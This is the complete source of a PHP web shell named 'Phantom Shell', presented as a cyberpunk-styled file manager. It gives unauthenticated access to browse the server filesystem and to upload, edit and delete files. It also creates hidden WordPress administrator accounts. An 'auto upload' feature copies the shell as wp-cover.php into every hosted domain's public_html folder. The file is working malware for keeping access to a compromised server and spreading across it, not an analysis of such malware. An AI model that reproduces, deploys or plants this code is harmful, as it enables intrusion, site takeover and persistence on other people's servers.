<?php

error_reporting(0);

// =============================================
// CORE FUNCTIONS & INITIALIZATION
// =============================================

$current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$current_dir = realpath($current_dir);
if ($current_dir === false) {
    $current_dir = getcwd();
}

$parent_dir = dirname($current_dir);
if ($parent_dir == $current_dir) {
    $parent_dir = false;
}

function formatSize($bytes) {
    if ($bytes >= 1073741824) {
        return number_format($bytes / 1073741824, 2) . ' GB';
    } elseif ($bytes >= 1048576) {
        return number_format($bytes / 1048576, 2) . ' MB';
    } elseif ($bytes >= 1024) {
        return number_format($bytes / 1024, 2) . ' KB';
    } elseif ($bytes > 1) {
        return $bytes . ' bytes';
    } elseif ($bytes == 1) {
        return $bytes . ' byte';
    }
    return '0 bytes';
}

function generateRandomPassword($length = 12) {
    $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*';
    $password = '';
    $max = strlen($chars) - 1;
    for ($i = 0; $i < $length; $i++) {
        $password .= $chars[random_int(0, $max)];
    }
    return $password;
}

function detectDomainForPath($path) {
    $document_root = $_SERVER['DOCUMENT_ROOT'] ?? '';
    $http_host = $_SERVER['HTTP_HOST'] ?? 'localhost';
    $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https://' : 'http://';
    
    if (!empty($document_root) && strpos($path, $document_root) === 0) {
        $relative_path = substr($path, strlen($document_root));
        return $protocol . $http_host . $relative_path;
    }
    
    $check_path = $path;
    while ($check_path != '/' && $check_path != '') {
        if (file_exists($check_path . '/wp-config.php')) {
            $config_content = file_get_contents($check_path . '/wp-config.php');
            if (preg_match("/define\(\s*['\"]WP_HOME['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/", $config_content, $matches)) {
                return $matches[1];
            }
            if (preg_match("/define\(\s*['\"]WP_SITEURL['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/", $config_content, $matches)) {
                return $matches[1];
            }
        }
        $check_path = dirname($check_path);
    }
    
    return null;
}

function extractDomainFromPath($path) {
    $patterns = [
        '/domains\/([^\/]+)/',
        '/([^\/]+)\/public_html/',
        '/www\/([^\/]+)/',
        '/htdocs\/([^\/]+)/',
    ];
    
    foreach ($patterns as $pattern) {
        if (preg_match($pattern, $path, $matches)) {
            return $matches[1];
        }
    }
    
    return null;
}

// =============================================
// AUTO UPLOAD FEATURE
// =============================================

$uploaded_clones = [];

if (isset($_GET['auto_upload'])) {
    $domains_path = $current_dir;
    $clones_created = [];
    
    if (basename($current_dir) !== 'domains') {
        $check_path = $current_dir;
        while ($check_path != '/' && $check_path != '') {
            if (basename($check_path) === 'domains') {
                $domains_path = $check_path;
                break;
            }
            $check_path = dirname($check_path);
        }
    }
    
    if (is_dir($domains_path)) {
        $items = scandir($domains_path);
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;
            
            $domain_path = $domains_path . '/' . $item;
            if (is_dir($domain_path)) {
                $public_html_path = $domain_path . '/public_html';
                if (is_dir($public_html_path)) {
                    $clone_name = 'wp-cover.php';
                    $clone_path = $public_html_path . '/' . $clone_name;
                    
                    if (copy(__FILE__, $clone_path)) {
                        $domain = $item;
                        $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https://' : 'http://';
                        
                        $config_domain = detectDomainForPath($public_html_path);
                        if ($config_domain) {
                            $url = rtrim($config_domain, '/') . '/' . $clone_name;
                        } else {
                            $url = $protocol . $domain . '/' . $clone_name;
                        }
                        
                        $clones_created[] = [
                            'domain' => $domain,
                            'path' => $clone_path,
                            'url' => $url
                        ];
                    }
                }
            }
        }
    }
    
    if (!empty($clones_created)) {
        $uploaded_clones = $clones_created;
        $message = "✅ Auto upload completed: " . count($clones_created) . " clones created";
        $message_type = 'success';
    } else {
        $message = "❌ No public_html folders found in domains directory";
        $message_type = 'warning';
    }
}

// =============================================
// ACTION HANDLERS
// =============================================

$message = '';
$message_type = '';

if (isset($_GET['wpadmin'])) {
    $wp_path = $current_dir;
    $found = false;
    
    while ($wp_path != '/' && $wp_path != '') {
        if (file_exists($wp_path . '/wp-load.php') || file_exists($wp_path . '/wp-config.php')) {
            $found = true;
            break;
        }
        $wp_path = dirname($wp_path);
    }
    
    if ($found && file_exists($wp_path . '/wp-load.php')) {
        require_once($wp_path . '/wp-load.php');
        
        $username = 'admin_' . substr(md5(time()), 0, 8);
        $password = generateRandomPassword();
        $email = $username . '@' . substr(md5($wp_path), 0, 6) . '.local';
        
        if (function_exists('wp_create_user')) {
            if (!username_exists($username) && !email_exists($email)) {
                $user_id = wp_create_user($username, $password, $email);
                
                if (!is_wp_error($user_id)) {
                    $user = new WP_User($user_id);
                    $user->set_role('administrator');
                    
                    $message = "WordPress Admin Created | Username: $username | Password: $password | Email: $email | Login: " . get_site_url() . "/wp-admin";
                    $message_type = 'success';
                } else {
                    $message = "Error creating user: " . $user_id->get_error_message();
                    $message_type = 'error';
                }
            } else {
                $message = "User already exists in WordPress database";
                $message_type = 'warning';
            }
        } else {
            $message = "WordPress not properly loaded";
            $message_type = 'error';
        }
    } else {
        $message = "WordPress installation not found";
        $message_type = 'error';
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['upload_file'])) {
    $uploaded_file = $_FILES['upload_file'];
    if ($uploaded_file['error'] === UPLOAD_ERR_OK) {
        $target_path = $current_dir . '/' . basename($uploaded_file['name']);
        if (move_uploaded_file($uploaded_file['tmp_name'], $target_path)) {
            $message = "File uploaded successfully: " . basename($uploaded_file['name']);
            $message_type = 'success';
        } else {
            $message = "Failed to upload file";
            $message_type = 'error';
        }
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create_dir'])) {
    $dir_name = trim($_POST['dir_name']);
    if (!empty($dir_name)) {
        $new_dir = $current_dir . '/' . preg_replace('/[^\w\-\.]/', '', $dir_name);
        if (!file_exists($new_dir)) {
            if (mkdir($new_dir, 0755)) {
                $message = "Directory created: " . htmlspecialchars($dir_name);
                $message_type = 'success';
            } else {
                $message = "Failed to create directory";
                $message_type = 'error';
            }
        } else {
            $message = "Directory already exists";
            $message_type = 'warning';
        }
    }
}

if (isset($_GET['delete'])) {
    $file_to_delete = $current_dir . '/' . basename($_GET['delete']);
    if (file_exists($file_to_delete)) {
        if (is_dir($file_to_delete)) {
            $success = rmdir($file_to_delete);
        } else {
            $success = unlink($file_to_delete);
        }
        if ($success) {
            header("Location: ?dir=" . urlencode($current_dir));
            exit;
        }
    }
}

if (isset($_GET['edit'])) {
    $file_to_edit = $current_dir . '/' . basename($_GET['edit']);
    if (file_exists($file_to_edit) && is_file($file_to_edit)) {
        $file_content = file_get_contents($file_to_edit);
        
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['file_content'])) {
            if (file_put_contents($file_to_edit, $_POST['file_content']) !== false) {
                $message = "File saved: " . htmlspecialchars(basename($_GET['edit']));
                $message_type = 'success';
                $file_content = $_POST['file_content'];
            }
        }
    }
}

// =============================================
// DIRECTORY SCANNING
// =============================================

$folders = [];
$files = [];

if (is_dir($current_dir) && is_readable($current_dir)) {
    $items = scandir($current_dir);
    if ($items !== false) {
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;
            
            $full_path = $current_dir . '/' . $item;
            
            if (is_dir($full_path)) {
                $folders[] = [
                    'name' => $item,
                    'path' => $full_path,
                    'modified' => filemtime($full_path),
                    'permissions' => substr(sprintf('%o', fileperms($full_path)), -3)
                ];
            } else {
                $files[] = [
                    'name' => $item,
                    'path' => $full_path,
                    'size' => filesize($full_path),
                    'modified' => filemtime($full_path),
                    'permissions' => substr(sprintf('%o', fileperms($full_path)), -3),
                    'extension' => strtolower(pathinfo($item, PATHINFO_EXTENSION))
                ];
            }
        }
    }
}

usort($folders, fn($a, $b) => strcmp($a['name'], $b['name']));
usort($files, fn($a, $b) => strcmp($a['name'], $b['name']));

// =============================================
// BREADCRUMBS
// =============================================

$breadcrumbs = [];
$parts = explode('/', trim($current_dir, '/'));
$path = '';
$breadcrumbs[] = ['name' => '🌐', 'path' => '/'];
foreach ($parts as $part) {
    if (!empty($part)) {
        $path .= '/' . $part;
        $breadcrumbs[] = ['name' => $part, 'path' => $path];
    }
}

$current_domain = detectDomainForPath($current_dir);

// =============================================
// UI RENDERING - CYBERPUNK THEME
// =============================================
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Phantom Shell | File Manager</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #0a0a0f;
            background-image: radial-gradient(circle at 25% 0%, rgba(0, 255, 255, 0.03) 0%, transparent 50%);
            font-family: 'JetBrains Mono', 'Fira Code', 'Courier New', monospace;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 1600px;
            margin: 0 auto;
        }

        /* Glow Effects */
        .glow-text {
            text-shadow: 0 0 10px rgba(0, 255, 255, 0.5);
        }

        .glow-border {
            border: 1px solid rgba(0, 255, 255, 0.3);
            box-shadow: 0 0 15px rgba(0, 255, 255, 0.1);
        }

        /* Header */
        .header {
            background: rgba(10, 10, 20, 0.9);
            backdrop-filter: blur(12px);
            border-bottom: 2px solid #00ffcc;
            padding: 20px 28px;
            margin-bottom: 24px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 16px;
            border-radius: 8px 8px 0 0;
            box-shadow: 0 4px 20px rgba(0, 255, 204, 0.1);
        }

        .logo h1 {
            font-size: 1.6rem;
            font-weight: 600;
            letter-spacing: -1px;
            background: linear-gradient(135deg, #00ffcc, #ff00cc);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .logo span {
            color: #5a5a7a;
            font-size: 0.8rem;
            font-family: monospace;
        }

        .domain-badge {
            background: rgba(0, 255, 204, 0.15);
            border: 1px solid #00ffcc;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 0.8rem;
            color: #00ffcc;
            margin-left: 12px;
        }

        /* Buttons - Neon Style */
        .btn {
            padding: 8px 16px;
            border: none;
            font-family: monospace;
            font-weight: 600;
            font-size: 0.85rem;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            transition: all 0.2s;
            text-decoration: none;
            background: rgba(20, 20, 40, 0.8);
            color: #ccccff;
            border-radius: 6px;
            border-left: 2px solid #00ffcc;
        }

        .btn:hover {
            background: #00ffcc20;
            color: #00ffcc;
            transform: translateX(2px);
            border-left-width: 4px;
        }

        .btn-primary {
            background: linear-gradient(135deg, #00ccaa, #0099ff);
            color: #0a0a0f;
            border-left: none;
        }

        .btn-primary:hover {
            background: linear-gradient(135deg, #00ffcc, #00ccff);
            color: #000;
            transform: translateY(-1px);
        }

        .btn-danger {
            border-left-color: #ff3366;
        }
        .btn-danger:hover {
            background: #ff336620;
            color: #ff6699;
        }

        .btn-success {
            border-left-color: #00ff66;
        }
        .btn-warning {
            border-left-color: #ffaa00;
        }
        .btn-purple {
            border-left-color: #cc44ff;
        }

        /* Breadcrumb - Terminal Style */
        .breadcrumb {
            background: #0f0f1a;
            padding: 12px 20px;
            margin-bottom: 20px;
            border-radius: 8px;
            border: 1px solid #1a1a2e;
            font-family: monospace;
        }

        .breadcrumb a {
            color: #00ffcc;
            text-decoration: none;
            font-size: 0.85rem;
            padding: 4px 8px;
            background: #1a1a2a;
            border-radius: 4px;
            transition: 0.2s;
        }

        .breadcrumb a:hover {
            background: #00ffcc;
            color: #0a0a0f;
        }

        .sep {
            color: #333355;
            margin: 0 8px;
        }

        /* Quick Nav - Pill Style */
        .quick-nav {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin-bottom: 20px;
            background: #0c0c14;
            padding: 12px 20px;
            border-radius: 40px;
            border: 1px solid #1a1a2a;
        }

        .nav-link {
            padding: 6px 14px;
            background: #12121c;
            border-radius: 30px;
            color: #8888aa;
            text-decoration: none;
            font-size: 0.8rem;
            transition: 0.2s;
        }

        .nav-link:hover {
            background: #00ffcc22;
            color: #00ffcc;
        }

        /* Controls Bar */
        .controls {
            display: flex;
            flex-wrap: wrap;
            gap: 16px;
            margin-bottom: 24px;
            background: #0c0c14;
            padding: 20px;
            border-radius: 12px;
            border: 1px solid #1a1a2a;
        }

        .control-group {
            display: flex;
            gap: 10px;
            align-items: center;
            background: #0a0a10;
            padding: 6px 12px;
            border-radius: 40px;
            border: 1px solid #202030;
        }

        .control-group input {
            background: #12121c;
            border: 1px solid #2a2a3a;
            padding: 8px 14px;
            border-radius: 30px;
            color: #ccddff;
            font-family: monospace;
            font-size: 0.85rem;
        }

        .control-group input:focus {
            outline: none;
            border-color: #00ffcc;
            box-shadow: 0 0 5px #00ffcc;
        }

        /* Main Layout */
        .two-columns {
            display: grid;
            grid-template-columns: 1fr 320px;
            gap: 24px;
        }

        /* Message */
        .message {
            margin-bottom: 20px;
            padding: 12px 20px;
            border-radius: 8px;
            font-family: monospace;
            font-weight: 500;
            border-left: 4px solid;
        }

        .message.success { background: #00ff6610; border-left-color: #00ff66; color: #88ffaa; }
        .message.error { background: #ff336610; border-left-color: #ff3366; color: #ff88aa; }
        .message.warning { background: #ffaa3310; border-left-color: #ffaa33; color: #ffcc88; }

        /* Section Headers */
        .section-title {
            font-size: 1rem;
            font-weight: 600;
            color: #00ffcc;
            margin: 24px 0 16px 0;
            padding-bottom: 6px;
            border-bottom: 1px dashed #00ffcc40;
            display: flex;
            align-items: center;
            gap: 8px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        /* Grid - Minimal Cards */
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
            gap: 14px;
        }

        .card {
            background: #0c0c14;
            border: 1px solid #1e1e2e;
            border-radius: 10px;
            padding: 16px;
            transition: 0.2s;
        }

        .card:hover {
            border-color: #00ffcc60;
            background: #10101a;
            transform: translateY(-2px);
        }

        .card-icon {
            font-size: 2rem;
            margin-bottom: 10px;
        }

        .card-name {
            color: #eef;
            font-weight: 600;
            word-break: break-all;
            font-size: 0.9rem;
            font-family: monospace;
        }

        .card-meta {
            font-size: 0.7rem;
            color: #666688;
            margin: 8px 0;
            padding: 6px 0;
            border-top: 1px solid #1a1a2a;
        }

        .card-actions {
            display: flex;
            gap: 8px;
            margin-top: 10px;
        }

        .action {
            padding: 4px 10px;
            font-size: 0.7rem;
            font-weight: 600;
            text-decoration: none;
            background: #12121c;
            border-radius: 4px;
            color: #aaaacc;
            transition: 0.2s;
        }

        .action:hover {
            background: #00ffcc;
            color: #0a0a0f;
        }

        .action-danger:hover {
            background: #ff3366;
            color: white;
        }

        /* Sidebar Widgets */
        .widget {
            background: #0c0c14;
            border: 1px solid #1e1e2e;
            border-radius: 12px;
            padding: 18px;
            margin-bottom: 20px;
        }

        .widget-title {
            color: #00ffcc;
            font-size: 0.85rem;
            font-weight: 600;
            margin-bottom: 14px;
            padding-bottom: 8px;
            border-bottom: 1px solid #1e1e2e;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .info-line {
            padding: 8px 0;
            border-bottom: 1px solid #14141e;
            font-size: 0.8rem;
            color: #8888aa;
        }

        .info-line strong {
            color: #ccddff;
            display: block;
            font-size: 0.75rem;
            margin-bottom: 3px;
        }

        /* Editor */
        .editor {
            background: #0a0a10;
            border: 1px solid #1e1e2e;
            border-radius: 12px;
            overflow: hidden;
        }

        .editor-header {
            background: #0f0f18;
            padding: 14px 20px;
            border-bottom: 1px solid #1e1e2e;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .editor-header h3 {
            color: #00ffcc;
            font-size: 0.9rem;
        }

        .editor textarea {
            width: 100%;
            min-height: 500px;
            padding: 20px;
            background: #050508;
            border: none;
            color: #aaffdd;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.85rem;
            line-height: 1.5;
            resize: vertical;
        }

        .editor textarea:focus {
            outline: none;
            background: #080810;
        }

        .editor-footer {
            padding: 14px 20px;
            background: #0f0f18;
            border-top: 1px solid #1e1e2e;
            text-align: right;
        }

        /* Empty state */
        .empty {
            text-align: center;
            padding: 60px 20px;
            color: #444466;
            background: #0c0c14;
            border-radius: 16px;
            border: 1px dashed #2a2a3a;
        }

        /* Status bar */
        .status {
            margin-top: 24px;
            background: #0c0c14;
            padding: 12px 20px;
            border-radius: 8px;
            border-top: 1px solid #00ffcc;
            display: flex;
            justify-content: space-between;
            font-size: 0.75rem;
            color: #666688;
        }

        /* Responsive */
        @media (max-width: 900px) {
            .two-columns { grid-template-columns: 1fr; }
            .controls { flex-direction: column; }
            .control-group { justify-content: space-between; }
        }
    </style>
</head>
<body>
<div class="container">
    <!-- Header -->
    <div class="header">
        <div class="logo">
            <h1>🌀 PHANTOM SHELL <span>v2.0 // encrypted</span>
            <?php if ($current_domain): ?>
            <span class="domain-badge">🌐 <?php echo htmlspecialchars(parse_url($current_domain, PHP_URL_HOST) ?: $current_domain); ?></span>
            <?php endif; ?>
            </h1>
        </div>
        <div class="header-actions" style="display: flex; gap: 12px;">
            <a href="?" class="btn btn-primary">⌂ ROOT</a>
            <a href="?auto_upload=1&dir=<?php echo urlencode($current_dir); ?>" class="btn btn-purple">⤴ AUTO UPLOAD</a>
        </div>
    </div>

    <!-- Breadcrumb -->
    <div class="breadcrumb">
        <?php foreach ($breadcrumbs as $i => $crumb): ?>
            <a href="?dir=<?php echo urlencode($crumb['path']); ?>"><?php echo htmlspecialchars($crumb['name']); ?></a>
            <?php if ($i < count($breadcrumbs)-1): ?><span class="sep">/</span><?php endif; ?>
        <?php endforeach; ?>
    </div>

    <!-- Quick Nav -->
    <div class="quick-nav">
        <?php if ($parent_dir): ?>
            <a href="?dir=<?php echo urlencode($parent_dir); ?>" class="nav-link">⬆ PARENT</a>
        <?php endif; ?>
        <a href="?dir=/" class="nav-link">🌐 ROOT</a>
        <a href="?dir=/home" class="nav-link">🏠 HOME</a>
        <a href="?dir=/var/www" class="nav-link">🌍 WWW</a>
        <a href="?dir=/tmp" class="nav-link">📁 TMP</a>
        <a href="?dir=<?php echo urlencode($current_dir); ?>&auto_upload=1" class="nav-link" style="background:#00ffcc10;">⤴ AUTO UPLOAD</a>
    </div>

    <!-- Controls -->
    <div class="controls">
        <div class="control-group">
            <form method="post" enctype="multipart/form-data" style="display: flex; gap: 8px;">
                <input type="file" name="upload_file" required>
                <button type="submit" class="btn btn-primary">UPLOAD</button>
            </form>
        </div>
        <div class="control-group">
            <form method="post" style="display: flex; gap: 8px;">
                <input type="text" name="dir_name" placeholder="folder_name" required>
                <button type="submit" name="create_dir" value="1" class="btn btn-success">MKDIR</button>
            </form>
        </div>
        <div class="control-group">
            <a href="?dir=<?php echo urlencode($current_dir); ?>&wpadmin=1" class="btn btn-warning">⚡ WP ADMIN</a>
            <a href="?dir=<?php echo urlencode($current_dir); ?>" class="btn">⟳ REFRESH</a>
        </div>
    </div>

    <!-- Message -->
    <?php if ($message): ?>
    <div class="message <?php echo $message_type; ?>">
        <?php echo $message; ?>
    </div>
    <?php endif; ?>

    <!-- Uploaded Clones Banner -->
    <?php if (!empty($uploaded_clones)): ?>
    <div class="widget" style="margin-bottom: 20px; border-color: #00ff66;">
        <div class="widget-title">🎯 CLONES DEPLOYED (wp-cover.php)</div>
        <?php foreach ($uploaded_clones as $clone): ?>
        <div style="padding: 8px 0; border-bottom: 1px solid #1e1e2e; display: flex; gap: 10px;">
            <span>🌐</span>
            <a href="<?php echo htmlspecialchars($clone['url']); ?>" target="_blank" style="color:#00ffcc; text-decoration:none;"><?php echo htmlspecialchars($clone['url']); ?></a>
            <span style="color:#88ffaa; font-size:0.7rem;">[<?php echo htmlspecialchars($clone['domain']); ?>]</span>
        </div>
        <?php endforeach; ?>
    </div>
    <?php endif; ?>

    <!-- Two columns -->
    <div class="two-columns">
        <!-- Main Area -->
        <div>
            <?php if (isset($file_content)): ?>
            <div class="editor">
                <div class="editor-header">
                    <h3>✏️ <?php echo htmlspecialchars(basename($_GET['edit'])); ?></h3>
                    <a href="?dir=<?php echo urlencode($current_dir); ?>" class="btn">← BACK</a>
                </div>
                <form method="post">
                    <textarea name="file_content"><?php echo htmlspecialchars($file_content); ?></textarea>
                    <div class="editor-footer">
                        <button type="submit" class="btn btn-success">💾 SAVE</button>
                    </div>
                </form>
            </div>
            <?php else: ?>
            
            <!-- Folders -->
            <?php if (!empty($folders)): ?>
            <div class="section-title"><span>📁</span> DIRECTORIES (<?php echo count($folders); ?>)</div>
            <div class="grid">
                <?php foreach ($folders as $folder): ?>
                <div class="card">
                    <div class="card-icon">📁</div>
                    <div class="card-name"><?php echo htmlspecialchars($folder['name']); ?></div>
                    <div class="card-meta">📅 <?php echo date('Y-m-d H:i', $folder['modified']); ?><br>🔒 <?php echo $folder['permissions']; ?></div>
                    <div class="card-actions">
                        <a href="?dir=<?php echo urlencode($folder['path']); ?>" class="action">OPEN</a>
                        <a href="?dir=<?php echo urlencode($current_dir); ?>&delete=<?php echo urlencode($folder['name']); ?>" class="action action-danger" onclick="return confirm('Delete folder?')">DEL</a>
                    </div>
                </div>
                <?php endforeach; ?>
            </div>
            <?php endif; ?>

            <!-- Files -->
            <?php if (!empty($files)): ?>
            <div class="section-title"><span>📄</span> FILES (<?php echo count($files); ?>)</div>
            <div class="grid">
                <?php foreach ($files as $file): 
                    $icon = '📄';
                    if ($file['extension'] == 'php') $icon = '🐘';
                    elseif (in_array($file['extension'], ['jpg','png','gif'])) $icon = '🖼️';
                    elseif (in_array($file['extension'], ['zip','tar','gz'])) $icon = '📦';
                ?>
                <div class="card">
                    <div class="card-icon"><?php echo $icon; ?></div>
                    <div class="card-name"><?php echo htmlspecialchars($file['name']); ?></div>
                    <div class="card-meta">💾 <?php echo formatSize($file['size']); ?> &nbsp;| 📅 <?php echo date('Y-m-d H:i', $file['modified']); ?></div>
                    <div class="card-actions">
                        <a href="?dir=<?php echo urlencode($current_dir); ?>&edit=<?php echo urlencode($file['name']); ?>" class="action">EDIT</a>
                        <a href="?dir=<?php echo urlencode($current_dir); ?>&delete=<?php echo urlencode($file['name']); ?>" class="action action-danger" onclick="return confirm('Delete file?')">DEL</a>
                    </div>
                </div>
                <?php endforeach; ?>
            </div>
            <?php endif; ?>

            <?php if (empty($folders) && empty($files)): ?>
            <div class="empty">
                <div style="font-size: 3rem;">📭</div>
                <p>EMPTY DIRECTORY</p>
            </div>
            <?php endif; ?>
            <?php endif; ?>
        </div>

        <!-- Sidebar -->
        <div>
            <div class="widget">
                <div class="widget-title"><span>💻</span> SYSTEM</div>
                <div class="info-line"><strong>PATH</strong><span style="word-break:break-all;"><?php echo htmlspecialchars($current_dir); ?></span></div>
                <?php if ($current_domain): ?>
                <div class="info-line"><strong>DOMAIN</strong><a href="<?php echo htmlspecialchars($current_domain); ?>" target="_blank" style="color:#00ffcc;"> <?php echo htmlspecialchars($current_domain); ?></a></div>
                <?php endif; ?>
                <div class="info-line"><strong>ITEMS</strong><?php echo count($folders); ?> dirs / <?php echo count($files); ?> files</div>
                <div class="info-line"><strong>DISK FREE</strong><?php echo formatSize(disk_free_space($current_dir)); ?></div>
                <div class="info-line"><strong>PHP</strong><?php echo PHP_VERSION; ?></div>
            </div>

            <div class="widget">
                <div class="widget-title"><span>⚡</span> ACTIONS</div>
                <div style="display: flex; flex-direction: column; gap: 8px;">
                    <a href="?dir=<?php echo urlencode(dirname(__FILE__)); ?>" class="btn" style="justify-content:center;">📍 SCRIPT LOC</a>
                    <a href="?dir=/var/www" class="btn" style="justify-content:center;">🌐 WEBROOT</a>
                    <a href="?dir=<?php echo urlencode($current_dir); ?>&auto_upload=1" class="btn btn-purple" style="justify-content:center;">⤴ AUTO DEPLOY</a>
                </div>
            </div>

            <?php if (strpos($current_dir, 'domains') !== false || basename($current_dir) === 'domains'): ?>
            <div class="widget">
                <div class="widget-title"><span>🌍</span> DOMAINS</div>
                <a href="?auto_upload=1&dir=<?php echo urlencode($current_dir); ?>" class="btn btn-success" style="justify-content:center; width:100%;">UPLOAD TO ALL DOMAINS</a>
            </div>
            <?php endif; ?>
        </div>
    </div>

    <!-- Status -->
    <div class="status">
        <span>📁 <?php echo htmlspecialchars($current_dir); ?></span>
        <span>🌀 PHANTOM SHELL // ACTIVE</span>
    </div>
</div>

<script>
    setTimeout(() => {
        document.querySelectorAll('.message').forEach(el => {
            el.style.opacity = '0';
            setTimeout(() => el.remove(), 500);
        });
    }, 4500);

    document.querySelectorAll('.clone-url, .wp-creds-box div').forEach(el => {
        el.addEventListener('click', function(e) {
            if (e.target.tagName === 'A') return;
            let text = this.innerText.split(': ')[1] || this.innerText;
            navigator.clipboard.writeText(text);
            let old = this.innerText;
            this.innerText = '✓ COPIED';
            setTimeout(() => this.innerText = old, 1200);
        });
    });

    document.addEventListener('keydown', e => {
        if (e.ctrlKey && e.key === 's' && document.querySelector('textarea')) {
            e.preventDefault();
            document.querySelector('.editor button[type="submit"]')?.click();
        }
        if (e.key === 'Escape') {
            let back = document.querySelector('.editor-header .btn');
            if (back) window.location.href = back.href;
        }
    });
</script>
</body>
</html>